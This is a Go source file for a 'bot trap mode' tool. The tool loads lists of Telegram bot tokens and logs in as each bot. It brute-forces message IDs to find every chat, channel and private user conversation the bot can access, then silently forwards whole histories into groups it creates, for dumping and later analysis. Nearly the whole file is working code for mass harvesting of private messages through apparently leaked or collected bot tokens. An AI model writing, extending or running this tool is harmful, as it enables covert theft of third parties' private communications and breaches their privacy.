package main

import (
	"context"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gotd/td/tg"
)

// TrapMode defines how trap groups are organized
type TrapMode string

const (
	TrapModePerBot TrapMode = "per-bot" // One trap group per bot token
	TrapModeShared TrapMode = "shared"  // All bots dump into the same group
)

// TrapConfig holds configuration for trap mode
type TrapConfig struct {
	Enabled       bool
	Mode          TrapMode
	SharedGroupID int64  // If shared mode, the group to dump into (0 = auto-create)
	GroupTitle     string // Custom prefix for group names (default: "dump")
}

// TrapOrchestrator coordinates the user-account and bot-account sessions
// to create trap groups, invite bots, and forward messages
type TrapOrchestrator struct {
	userAPI     *tg.Client // User account MTProto client
	botAPI      *tg.Client // Bot MTProto client (set per-bot)
	config      *TrapConfig
	rateLimiter *RateLimiter
	storage     *Storage

	// Discovered chat peers from bot's message enumeration
	discoveredPeers map[int64]tg.InputPeerClass
	// Channels need special handling (access hash from entities)
	discoveredChannels map[int64]*tg.Channel
}

// NewTrapOrchestrator creates a new trap orchestrator
func NewTrapOrchestrator(userAPI *tg.Client, config *TrapConfig, rateLimiter *RateLimiter, storage *Storage) *TrapOrchestrator {
	return &TrapOrchestrator{
		userAPI:            userAPI,
		config:             config,
		rateLimiter:        rateLimiter,
		storage:            storage,
		discoveredPeers:    make(map[int64]tg.InputPeerClass),
		discoveredChannels: make(map[int64]*tg.Channel),
	}
}

// SetBotAPI sets the bot API client for the current bot being processed
func (t *TrapOrchestrator) SetBotAPI(botAPI *tg.Client) {
	t.botAPI = botAPI
	// Reset discovered peers for the new bot
	t.discoveredPeers = make(map[int64]tg.InputPeerClass)
	t.discoveredChannels = make(map[int64]*tg.Channel)
}

// CreateTrapGroup creates a group for dumping bot messages into
// Returns the chat ID of the created group
func (t *TrapOrchestrator) CreateTrapGroup(ctx context.Context, botUsername string, botUserID int64) (int64, error) {
	title := fmt.Sprintf("%s_%s", t.config.GroupTitle, botUsername)
	if t.config.GroupTitle == "" {
		title = fmt.Sprintf("dump_%s", botUsername)
	}

	fmt.Printf("[TRAP] Creating trap group: %s\n", title)

	if err := t.rateLimiter.Wait(ctx); err != nil {
		return 0, fmt.Errorf("rate limiter error: %w", err)
	}

	// Create the group using the user account
	// We create a basic group (not supergroup) — simpler and sufficient
	result, err := t.userAPI.MessagesCreateChat(ctx, &tg.MessagesCreateChatRequest{
		Users: []tg.InputUserClass{
			// Must include at least one other user — we'll add the bot
			&tg.InputUser{UserID: botUserID},
		},
		Title: title,
	})
	if err != nil {
		return 0, fmt.Errorf("failed to create trap group: %w", err)
	}

	// Extract the chat ID from the updates inside MessagesInvitedUsers
	chatID := t.extractChatIDFromUpdates(result.Updates)
	if chatID == 0 {
		return 0, fmt.Errorf("failed to extract chat ID from group creation response")
	}

	fmt.Printf("[TRAP] Created trap group '%s' (chat_id=%d)\n", title, chatID)
	return chatID, nil
}

// GetOrCreateSharedGroup gets the shared trap group or creates one
func (t *TrapOrchestrator) GetOrCreateSharedGroup(ctx context.Context, botUserID int64) (int64, error) {
	if t.config.SharedGroupID != 0 {
		fmt.Printf("[TRAP] Using existing shared group: %d\n", t.config.SharedGroupID)
		return t.config.SharedGroupID, nil
	}

	title := "dump_shared"
	if t.config.GroupTitle != "" {
		title = t.config.GroupTitle + "_shared"
	}

	fmt.Printf("[TRAP] Creating shared trap group: %s\n", title)

	if err := t.rateLimiter.Wait(ctx); err != nil {
		return 0, fmt.Errorf("rate limiter error: %w", err)
	}

	result, err := t.userAPI.MessagesCreateChat(ctx, &tg.MessagesCreateChatRequest{
		Users: []tg.InputUserClass{
			&tg.InputUser{UserID: botUserID},
		},
		Title: title,
	})
	if err != nil {
		return 0, fmt.Errorf("failed to create shared trap group: %w", err)
	}

	chatID := t.extractChatIDFromUpdates(result.Updates)
	if chatID == 0 {
		return 0, fmt.Errorf("failed to extract chat ID from shared group creation")
	}

	// Cache for subsequent bots
	t.config.SharedGroupID = chatID
	fmt.Printf("[TRAP] Created shared trap group '%s' (chat_id=%d)\n", title, chatID)
	return chatID, nil
}

// ResolveBotUsername resolves a bot's username to an InputUser using the user account
func (t *TrapOrchestrator) ResolveBotUsername(ctx context.Context, username string) (*tg.InputUser, error) {
	if err := t.rateLimiter.Wait(ctx); err != nil {
		return nil, fmt.Errorf("rate limiter error: %w", err)
	}

	// Remove @ prefix if present
	username = strings.TrimPrefix(username, "@")

	resolved, err := t.userAPI.ContactsResolveUsername(ctx, &tg.ContactsResolveUsernameRequest{
		Username: username,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to resolve username @%s: %w", username, err)
	}

	for _, user := range resolved.Users {
		if u, ok := user.(*tg.User); ok {
			return &tg.InputUser{
				UserID:     u.ID,
				AccessHash: u.AccessHash,
			}, nil
		}
	}

	return nil, fmt.Errorf("no user found for username @%s", username)
}

// InviteBotToGroup adds the bot to an existing group (if not already in it from creation)
func (t *TrapOrchestrator) InviteBotToGroup(ctx context.Context, chatID int64, botInput *tg.InputUser) error {
	if err := t.rateLimiter.Wait(ctx); err != nil {
		return fmt.Errorf("rate limiter error: %w", err)
	}

	_, err := t.userAPI.MessagesAddChatUser(ctx, &tg.MessagesAddChatUserRequest{
		ChatID: chatID,
		UserID: botInput,
		FwdLimit: 0,
	})
	if err != nil {
		// Bot might already be in the group (from creation)
		if strings.Contains(err.Error(), "USER_ALREADY_PARTICIPANT") {
			fmt.Printf("[TRAP] Bot already in group %d\n", chatID)
			return nil
		}
		return fmt.Errorf("failed to add bot to group %d: %w", chatID, err)
	}

	fmt.Printf("[TRAP] Bot added to group %d\n", chatID)
	return nil
}

// DiscoverBotChats uses the bot's MTProto session to discover all chats
// it has access to by scanning message IDs (same brute-force approach
// as the existing dumper, but we collect peer info instead of saving)
func (t *TrapOrchestrator) DiscoverBotChats(ctx context.Context, maxMsgID int, lookahead int) error {
	fmt.Printf("[TRAP] Discovering bot's chats via message ID enumeration (up to ID %d)...\n", maxMsgID)

	step := 200
	emptyRuns := 0
	maxEmptyRuns := lookahead + 1
	totalDiscovered := 0

	for fromID := 0; fromID < maxMsgID || emptyRuns < maxEmptyRuns; fromID += step {
		// Build ID range
		ids := make([]tg.InputMessageClass, 0, step)
		for i := fromID; i < fromID+step; i++ {
			ids = append(ids, &tg.InputMessageID{ID: i})
		}

		if err := t.rateLimiter.Wait(ctx); err != nil {
			return fmt.Errorf("rate limiter error: %w", err)
		}

		result, err := t.botAPI.MessagesGetMessages(ctx, ids)
		if err != nil {
			fmt.Printf("[TRAP] Warning: GetMessages batch %d-%d failed: %v\n", fromID, fromID+step, err)
			emptyRuns++
			if emptyRuns >= maxEmptyRuns {
				break
			}
			continue
		}

		msgs, ok := result.(*tg.MessagesMessages)
		if !ok {
			emptyRuns++
			if emptyRuns >= maxEmptyRuns {
				break
			}
			continue
		}

		// Collect channel info from entities (need access hashes)
		for _, chat := range msgs.Chats {
			if ch, ok := chat.(*tg.Channel); ok {
				if _, exists := t.discoveredChannels[ch.ID]; !exists {
					t.discoveredChannels[ch.ID] = ch
					t.discoveredPeers[ch.ID] = &tg.InputPeerChannel{
						ChannelID:  ch.ID,
						AccessHash: ch.AccessHash,
					}
					fmt.Printf("[TRAP] Discovered channel: %s (ID: %d)\n", ch.Title, ch.ID)
					totalDiscovered++
				}
			}
			if c, ok := chat.(*tg.Chat); ok {
				if _, exists := t.discoveredPeers[c.ID]; !exists {
					t.discoveredPeers[c.ID] = &tg.InputPeerChat{ChatID: c.ID}
					fmt.Printf("[TRAP] Discovered chat: %s (ID: %d)\n", c.Title, c.ID)
					totalDiscovered++
				}
			}
		}

		// Also discover user chats from messages
		for _, m := range msgs.Messages {
			msg, ok := m.(*tg.Message)
			if !ok {
				continue
			}
			if msg.PeerID != nil {
				switch p := msg.PeerID.(type) {
				case *tg.PeerUser:
					if _, exists := t.discoveredPeers[p.UserID]; !exists {
						// Find access hash from entities
						for _, u := range msgs.Users {
							if user, ok := u.(*tg.User); ok && user.ID == p.UserID {
								t.discoveredPeers[p.UserID] = &tg.InputPeerUser{
									UserID:     user.ID,
									AccessHash: user.AccessHash,
								}
								fmt.Printf("[TRAP] Discovered user chat: %s %s (ID: %d)\n",
									user.FirstName, user.LastName, user.ID)
								totalDiscovered++
								break
							}
						}
					}
				case *tg.PeerChat:
					if _, exists := t.discoveredPeers[p.ChatID]; !exists {
						t.discoveredPeers[p.ChatID] = &tg.InputPeerChat{ChatID: p.ChatID}
						totalDiscovered++
					}
				case *tg.PeerChannel:
					if _, exists := t.discoveredPeers[p.ChannelID]; !exists {
						for _, chat := range msgs.Chats {
							if ch, ok := chat.(*tg.Channel); ok && ch.ID == p.ChannelID {
								t.discoveredPeers[p.ChannelID] = &tg.InputPeerChannel{
									ChannelID:  ch.ID,
									AccessHash: ch.AccessHash,
								}
								totalDiscovered++
								break
							}
						}
					}
				}
			}
		}

		// Track empty runs
		foundNonEmpty := false
		for _, m := range msgs.Messages {
			if _, empty := m.(*tg.MessageEmpty); !empty {
				foundNonEmpty = true
				break
			}
		}
		if !foundNonEmpty {
			emptyRuns++
		} else {
			emptyRuns = 0
		}

		if emptyRuns >= maxEmptyRuns && fromID >= maxMsgID {
			break
		}
	}

	fmt.Printf("[TRAP] Discovery complete: %d unique chats/channels/users found\n", totalDiscovered)
	return nil
}

// ForwardChatHistory forwards all messages from a discovered chat to the trap group
// Uses the bot's MTProto session to call messages.forwardMessages
func (t *TrapOrchestrator) ForwardChatHistory(ctx context.Context, fromPeer tg.InputPeerClass, trapChatID int64, peerLabel string) (int, error) {
	fmt.Printf("[TRAP] Forwarding messages from %s to trap group %d...\n", peerLabel, trapChatID)

	trapPeer := &tg.InputPeerChat{ChatID: trapChatID}

	// First, get the history to know what message IDs exist
	totalForwarded := 0
	offsetID := 0

	for {
		if err := t.rateLimiter.Wait(ctx); err != nil {
			return totalForwarded, fmt.Errorf("rate limiter error: %w", err)
		}

		history, err := t.botAPI.MessagesGetHistory(ctx, &tg.MessagesGetHistoryRequest{
			Peer:     fromPeer,
			OffsetID: offsetID,
			Limit:    100,
		})
		if err != nil {
			// Bot might not have access to this chat's history
			if strings.Contains(err.Error(), "CHAT_ADMIN_REQUIRED") ||
				strings.Contains(err.Error(), "CHANNEL_PRIVATE") ||
				strings.Contains(err.Error(), "CHAT_WRITE_FORBIDDEN") {
				fmt.Printf("[TRAP] No history access for %s: %v\n", peerLabel, err)
				return totalForwarded, nil
			}
			return totalForwarded, fmt.Errorf("failed to get history for %s: %w", peerLabel, err)
		}

		var messages []tg.MessageClass
		switch h := history.(type) {
		case *tg.MessagesMessages:
			messages = h.Messages
		case *tg.MessagesMessagesSlice:
			messages = h.Messages
		case *tg.MessagesChannelMessages:
			messages = h.Messages
		default:
			break
		}

		if len(messages) == 0 {
			break
		}

		// Collect non-empty message IDs for forwarding
		msgIDs := make([]int, 0, len(messages))
		for _, m := range messages {
			switch msg := m.(type) {
			case *tg.Message:
				msgIDs = append(msgIDs, msg.ID)
			case *tg.MessageService:
				// Skip service messages — they can't be forwarded
			}
		}

		if len(msgIDs) > 0 {
			// Forward in batches of 100 (Telegram limit)
			for i := 0; i < len(msgIDs); i += 100 {
				end := i + 100
				if end > len(msgIDs) {
					end = len(msgIDs)
				}
				batch := msgIDs[i:end]

				if err := t.rateLimiter.Wait(ctx); err != nil {
					return totalForwarded, fmt.Errorf("rate limiter error: %w", err)
				}

				// Generate random IDs for each forwarded message
				randomIDs := make([]int64, len(batch))
				for j := range randomIDs {
					randomIDs[j] = time.Now().UnixNano() + int64(j)
				}

				_, err := t.botAPI.MessagesForwardMessages(ctx, &tg.MessagesForwardMessagesRequest{
					FromPeer: fromPeer,
					ToPeer:   trapPeer,
					ID:       batch,
					RandomID: randomIDs,
					Silent:   true, // Don't send notifications
				})
				if err != nil {
					fmt.Printf("[TRAP] Warning: failed to forward batch from %s: %v\n", peerLabel, err)
					// Continue with next batch — some messages might be restricted
					continue
				}

				totalForwarded += len(batch)
				fmt.Printf("[TRAP] Forwarded %d messages from %s (total: %d)\n",
					len(batch), peerLabel, totalForwarded)
			}
		}

		// Update offset for next page
		lastMsg := messages[len(messages)-1]
		switch m := lastMsg.(type) {
		case *tg.Message:
			offsetID = m.ID
		case *tg.MessageService:
			offsetID = m.ID
		case *tg.MessageEmpty:
			offsetID = m.ID
		}

		// If we got fewer than requested, we've hit the end
		if len(messages) < 100 {
			break
		}
	}

	fmt.Printf("[TRAP] Completed forwarding from %s: %d messages total\n", peerLabel, totalForwarded)
	return totalForwarded, nil
}

// ForwardAllDiscoveredChats forwards messages from all discovered chats to the trap group
func (t *TrapOrchestrator) ForwardAllDiscoveredChats(ctx context.Context, trapChatID int64) error {
	fmt.Printf("[TRAP] Starting mass forward of %d discovered chats to trap group %d\n",
		len(t.discoveredPeers), trapChatID)

	totalMessages := 0
	successfulChats := 0
	failedChats := 0

	for peerID, peer := range t.discoveredPeers {
		label := fmt.Sprintf("peer_%d", peerID)

		// Try to get a nicer label
		if ch, ok := t.discoveredChannels[peerID]; ok {
			label = fmt.Sprintf("channel:%s(%d)", ch.Title, peerID)
		}

		count, err := t.ForwardChatHistory(ctx, peer, trapChatID, label)
		if err != nil {
			fmt.Printf("[TRAP] Error forwarding %s: %v\n", label, err)
			failedChats++
			continue
		}

		totalMessages += count
		if count > 0 {
			successfulChats++
		}

		// Small delay between chats to be nice to Telegram
		time.Sleep(500 * time.Millisecond)
	}

	fmt.Printf("[TRAP] === FORWARD COMPLETE ===\n")
	fmt.Printf("[TRAP] Total messages forwarded: %d\n", totalMessages)
	fmt.Printf("[TRAP] Successful chats: %d\n", successfulChats)
	fmt.Printf("[TRAP] Failed chats: %d\n", failedChats)

	return nil
}

// RunTrapMode executes the full trap workflow for a single bot token
func (t *TrapOrchestrator) RunTrapMode(ctx context.Context, botToken string, maxMsgID int, lookahead int) error {
	// Step 1: Get bot info via Bot API getMe equivalent
	botIDStr := strings.Split(botToken, ":")[0]
	botID, err := strconv.ParseInt(botIDStr, 10, 64)
	if err != nil {
		return fmt.Errorf("invalid bot token format: %w", err)
	}

	fmt.Printf("\n[TRAP] ============================================================\n")
	fmt.Printf("[TRAP] Processing bot: %s\n", botIDStr)
	fmt.Printf("[TRAP] ============================================================\n")

	// Step 2: Auth as the bot to get its username
	// (The bot client should already be authenticated by the caller)
	me, err := t.botAPI.UsersGetFullUser(ctx, &tg.InputUserSelf{})
	if err != nil {
		return fmt.Errorf("failed to get bot info: %w", err)
	}

	var botUser *tg.User
	for _, u := range me.Users {
		if user, ok := u.(*tg.User); ok && user.ID == botID {
			botUser = user
			break
		}
	}
	if botUser == nil && len(me.Users) > 0 {
		if user, ok := me.Users[0].(*tg.User); ok {
			botUser = user
		}
	}
	if botUser == nil {
		return fmt.Errorf("could not get bot user info")
	}

	botUsername := botUser.Username
	fmt.Printf("[TRAP] Bot: @%s (ID: %d, Name: %s)\n", botUsername, botUser.ID, botUser.FirstName)

	// Step 3: Resolve bot via user account to get InputUser with access hash
	botInput, err := t.ResolveBotUsername(ctx, botUsername)
	if err != nil {
		return fmt.Errorf("failed to resolve bot: %w", err)
	}

	// Step 4: Create or get trap group
	var trapChatID int64
	switch t.config.Mode {
	case TrapModePerBot:
		trapChatID, err = t.CreateTrapGroup(ctx, botUsername, botInput.UserID)
	case TrapModeShared:
		trapChatID, err = t.GetOrCreateSharedGroup(ctx, botInput.UserID)
	default:
		trapChatID, err = t.CreateTrapGroup(ctx, botUsername, botInput.UserID)
	}
	if err != nil {
		return fmt.Errorf("failed to setup trap group: %w", err)
	}

	// Step 5: Ensure bot is in the group
	// (It should already be from group creation, but just in case for shared mode)
	if t.config.Mode == TrapModeShared {
		if err := t.InviteBotToGroup(ctx, trapChatID, botInput); err != nil {
			fmt.Printf("[TRAP] Warning: could not invite bot to shared group: %v\n", err)
			// Continue anyway — might already be in the group
		}
	}

	// Step 6: Discover all chats the bot has access to
	if err := t.DiscoverBotChats(ctx, maxMsgID, lookahead); err != nil {
		return fmt.Errorf("chat discovery failed: %w", err)
	}

	if len(t.discoveredPeers) == 0 {
		fmt.Printf("[TRAP] No chats discovered for bot @%s — nothing to forward\n", botUsername)
		return nil
	}

	// Step 7: Forward all discovered messages to the trap group
	if err := t.ForwardAllDiscoveredChats(ctx, trapChatID); err != nil {
		return fmt.Errorf("forwarding failed: %w", err)
	}

	// Step 8: Save trap results
	trapResults := map[string]interface{}{
		"bot_id":           botUser.ID,
		"bot_username":     botUsername,
		"trap_group_id":    trapChatID,
		"trap_mode":        string(t.config.Mode),
		"discovered_chats": len(t.discoveredPeers),
		"timestamp":        time.Now().UTC().Format(time.RFC3339),
	}
	if err := t.storage.SaveJSON(fmt.Sprintf("trap_%s.json", botIDStr), trapResults); err != nil {
		fmt.Printf("[TRAP] Warning: failed to save trap results: %v\n", err)
	}

	fmt.Printf("[TRAP] Bot @%s processing complete\n", botUsername)
	return nil
}

// extractChatIDFromUpdates pulls the chat ID from the update response after creating a group
func (t *TrapOrchestrator) extractChatIDFromUpdates(updates tg.UpdatesClass) int64 {
	switch u := updates.(type) {
	case *tg.Updates:
		for _, update := range u.Updates {
			switch upd := update.(type) {
			case *tg.UpdateNewMessage:
				if msg, ok := upd.Message.(*tg.MessageService); ok {
					if peer, ok := msg.PeerID.(*tg.PeerChat); ok {
						return peer.ChatID
					}
				}
			}
		}
		// Also check chats
		for _, chat := range u.Chats {
			if c, ok := chat.(*tg.Chat); ok {
				return c.ID
			}
		}
	case *tg.UpdateShortMessage:
		// Shouldn't happen for group creation but handle it
		return 0
	}
	return 0
}

// SaveDiscoveredChatsManifest saves a JSON manifest of all discovered chats
// for post-analysis
func (t *TrapOrchestrator) SaveDiscoveredChatsManifest(botIDStr string) error {
	manifest := make([]map[string]interface{}, 0, len(t.discoveredPeers))

	for peerID := range t.discoveredPeers {
		entry := map[string]interface{}{
			"peer_id": peerID,
		}

		if ch, ok := t.discoveredChannels[peerID]; ok {
			entry["type"] = "channel"
			entry["title"] = ch.Title
			entry["username"] = ch.Username
			entry["megagroup"] = ch.Megagroup
			entry["broadcast"] = ch.Broadcast
		} else {
			entry["type"] = "chat_or_user"
		}

		manifest = append(manifest, entry)
	}

	return t.storage.SaveJSON(fmt.Sprintf("trap_%s_chats.json", botIDStr), manifest)
}

// PrintTrapBanner prints a banner for trap mode
func PrintTrapBanner() {
	banner := `
╔══════════════════════════════════════════════════════════════╗
║                    BOT TRAP MODE                             ║
║                                                              ║
║  Creates groups, invites bots, discovers their chats,        ║
║  and forwards all messages to trap groups for dumping.        ║
║                                                              ║
║  User account required for group creation & bot invitation.   ║
╚══════════════════════════════════════════════════════════════╝`
	fmt.Println(banner)
}

// LoadTokensFromFile reads bot tokens from a file (one per line)
func LoadTokensFromFile(path string) ([]string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("failed to read tokens file: %w", err)
	}

	var tokens []string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		// Validate token format: numeric_id:alphanumeric_hash
		parts := strings.SplitN(line, ":", 2)
		if len(parts) != 2 {
			fmt.Printf("[TRAP] Skipping invalid token line: %s\n", line)
			continue
		}
		if _, err := strconv.ParseInt(parts[0], 10, 64); err != nil {
			fmt.Printf("[TRAP] Skipping invalid token (bad ID): %s\n", line)
			continue
		}
		tokens = append(tokens, line)
	}

	return tokens, nil
}
